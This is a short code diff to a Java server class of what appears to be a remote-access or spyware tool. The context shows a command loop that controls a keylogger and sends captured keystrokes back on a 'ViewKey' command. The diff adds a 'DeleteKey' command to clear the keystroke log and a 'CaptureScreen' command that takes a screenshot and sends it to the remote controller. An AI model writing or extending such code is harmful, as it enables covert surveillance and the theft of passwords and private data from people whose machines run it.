@@ -79,6 +79,10 @@ public class Server {
                     this.keyLogger.StopHooking();
                 } else if (cmdString.equalsIgnoreCase("ViewKey")) {
                     SendData("ViewKey", keyLogger.GetKey());
+                } else if (cmdString.equalsIgnoreCase("DeleteKey")) {
+                    keyLogger.Delete();
+                } else if (cmdString.equalsIgnoreCase("CaptureScreen")) {
+                    SendData("CaptureScreen", ScreenCapture.Capture());
                 } else {
                     SendCommand("None");
                 }
